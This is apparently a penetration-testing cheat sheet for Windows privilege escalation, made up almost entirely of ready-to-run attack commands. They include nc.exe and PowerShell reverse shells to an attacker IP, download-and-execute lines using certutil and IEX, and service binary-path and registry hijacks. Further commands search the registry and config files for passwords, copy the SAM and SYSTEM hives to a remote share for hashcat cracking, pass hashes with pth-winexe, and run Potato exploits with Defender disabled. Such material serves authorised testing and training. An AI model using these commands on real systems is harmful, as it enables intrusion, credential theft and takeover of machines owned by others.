---
sidebar_position: 5
---

# Windows Privilege Escalation

This page provides a comprehensive guide for Windows privilege escalation and exploitation techniques, including practical commands, tools, and tips. Use these methods to enumerate, exploit, and escalate privileges on Windows systems during penetration testing.

## Shell Handling Techniques

### Reverse Shell

- **Basic reverse shell using nc.exe:**

```cmd
nc.exe 192.168.119.1 443 -e cmd.exe
```

- **From a network share:**

```cmd
\\192.168.119.1\a\bin\nc.exe 192.168.119.1 443 -e cmd.exe
```

- **PowerShell reverse shell:**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.119.1",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

- **Shorter PowerShell variant:**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.1',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Basic System Enumeration

```cmd
whoami
systeminfo
```

Or from a share:

```cmd
\\192.168.119.1\a\bin\whoami.exe
```

## Downloading Tools

```cmd
certutil -URLcache -f http://192.168.119.1:8080/t/tool.exe tool.exe
powershell -c "Invoke-Webrequest -OutFile tool.exe -Uri http://192.168.119.1:8080/t/tool.exe"
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://192.168.119.1:8080/t/tool.ps1')"
copy /B \\192.168.119.1\a\t\winPEASany.exe winPEASany.exe
copy /B \\192.168.119.1\a\bin\nc.exe nc.exe
copy /B \\192.168.119.1\a\bin\accesschk.exe accesschk.exe
copy /B \\192.168.119.1\a\bin\plink64.exe plink64.exe
```

## Automated Enumeration Tools

### winPEAS

- [winPEAS Download](https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe)

```cmd
copy /B \\192.168.119.1\a\t\winPEASany.exe winPEASany.exe
./winPEASany.exe
```

### Seatbelt

- [Seatbelt Download](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe)

### SharpUp

- [SharpUp Download](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe)

### PowerUp

- [PowerUp.ps1](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)

### Powerless.bat

- [Powerless.bat](https://raw.githubusercontent.com/gladiatx0r/Powerless/master/Powerless.bat)

### accesschk.exe

- [accesschk.exe (phackt)](https://github.com/phackt/pentest/tree/master/privesc/windows)
- [accesschk.exe (ankh2054)](https://github.com/ankh2054/windows-pentest/tree/master/Privelege)

## Service Exploitation

- [HackTricks: Windows Service Privilege Escalation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services)

### Service Enumeration & Manipulation

```cmd
sc.exe qc <name>         # Query service config
sc.exe query <name>      # Query service status
sc.exe config <name> <option>= <value>  # Change config (note space after '=')
net start <name>         # Start service
net stop <name>          # Stop service
```

```cmd
winPEASany.exe quiet servicesinfo
```

### Insecure Service Properties

- [Modify Service Binary Path](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#modify-service-binary-path)

```cmd
accesschk.exe /accepteula -ucqv <name>
# Look for SERVICE_CHANGE_CONFIG, SERVICE_START, SERVICE_STOP
sc qc <name>
# Look for SERVICE_START_NAME : LOCALSYSTEM
sc config <name> binpath= "C:\rs.exe"
net stop <name>
net start <name>
```

### Unquoted Service Paths

- [Unquoted Service Paths](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#unquoted-service-paths)

```cmd
accesschk.exe /accepteula -uwdq "C:\Program Files\Some Folder\Service.exe"
# Look for RW BUILTIN\USERS
copy rs.exe "C:\Program Files\Some.exe"
net stop <name>
net start <name>
```

### Weak Registry Permissions

- [Modify Service Registry Permissions](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-modify-permissions)

```powershell
get-acl HKLM:\System\CurrentControlSet\services\<name> | Format-List
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\services\<name>
accesschk.exe /accepteula -ucqv <name>
# Look for SERVICE_CHANGE_CONFIG, SERVICE_START, SERVICE_STOP
reg query HKLM\System\CurrentControlSet\services\<name>
reg add HKLM\SYSTEM\CurrentControlSet\services\<name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
net stop <name>
net start <name>
```

### Insecure Service Executables

- [Service Executable Permissions](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#permissions)

```cmd
accesschk.exe /accepteula -quvw <path>
# Look for RW EVERYONE
accesschk.exe /accepteula -uvqc <path>
copy <path> c:\Temp
copy /Y rs.exe <path>
net stop <name>
net start <name>
```

### DLL Hijacking

- [DLL Hijacking](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking)

## Password & Credential Attacks

```cmd
winPEASany.exe quiet fileinfo userinfo
```

### Password Leak in Registry

```cmd
reg query HKLM /f password /t REG_SG /s
reg query HKCU /f password /t REG_SG /s
```

### Winexe (Remote Command Execution)

```cmd
winexe -U 'admin%adminpassword' //10.10.10.10 cmd.exe
winexe -U 'admin%adminpassword' --system //10.10.10.10 cmd.exe
```

### Saved Credentials

```cmd
winPEASany.exe quiet cmd windowscreds
cmdkey /list
runas /savecred /user:admin rs.exe
```

### Config Files

```cmd
winPEASany.exe quiet cmd searchfast fileinfo
dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt
```

### Security Password Manager

```cmd
copy C:\Windows\Repair\SAM \\192.168.119.160\a\
copy C:\Windows\Repair\SYSTEM \\192.168.119.160\a\
cd creddump7
python2 pwdump.py SYSTEM SAM
# admin:1004:aad3b4...:<hash>:::
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

### Passing Password Hash

```cmd
pth-winexe -U 'admin:1004:aad3b4...:<hash>' //10.10.10.10 cmd.exe
pth-winexe --system -U 'admin:1004:aad3b4...:<hash>' //10.10.10.10 cmd.exe
```

## Potato Exploits

- [Potato Exploit Overview](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)

### Hot Potato

- [Potato.exe Download](https://github.com/foxglovesec/Potato/raw/master/source/Potato/Potato/bin/Release/Potato.exe)

```cmd
Potato.exe -ip 192.168.119.160 -cmd "rs.exe" -disable_exhaust true -disable_defender true -enable_httpserver true -enable_spoof true
```

## Kernel Exploits

- [Windows Kernel Exploits (SecWiki)](https://github.com/SecWiki/windows-kernel-exploits)
- [WES-NG: Windows Exploit Suggester](https://github.com/bitsadmin/wesng)

```cmd
systeminfo > \\192.168.119.160\a\systeminfo.txt
python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
```

## Active Directory (AD) Attacks

- [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

## Further Reading & References

- [Udemy: Windows Privilege Escalation](https://www.udemy.com/course/windows-privilege-escalation)
- [Japanese: Privilege Escalation Memo](https://kakyouim.hatenablog.com/entry/2020/03/14/031746#Windows)
- [Japanese: Privilege Escalation Exploit Windows](https://kakyouim.hatenablog.com/entry/2020/04/17/182049#Privilege-Escalation-IG-windows)
